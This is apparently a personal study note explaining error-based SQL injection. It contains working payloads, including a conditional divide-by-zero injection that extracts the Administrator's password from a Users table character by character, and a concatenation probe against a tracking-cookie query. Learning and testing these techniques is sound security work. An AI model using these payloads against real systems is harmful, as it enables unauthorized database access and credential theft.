---
Title: Error-based SQLi
tags:
  - SQLi
  - ERROR-BASEDSQLi
---
Error based sql is focused on error messages that a website returns, and exploiting that to extract sensitive data from the database.

> [!Example]
> ```sql
> xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
> --- in simpler terms: if 1=2, execute 1/0 (1 divided by 0, which returns a database error), else, return 'a'
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

We can exploit these errors, just like we did in [[Blind SQLi]].
> [!Sample Payload]
> ```sql
> xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
> --- If the condition is true, it should return an error, else, the condition will return true because of 'a' = 'a'

To further understand this, let's create the sample query:
> [!Sample query]
> ```sql
> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'some-id-here'
> --- now let's say for example this is our payload
> --- '||(SELECT '' FROM dual)'
> --- it will appear on the query that will be executed like this
> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'some-id-here'||(SELECT '' FROM dual)||'
> --- the inside parameter is like an eval, which returns the string ''.
> 




 






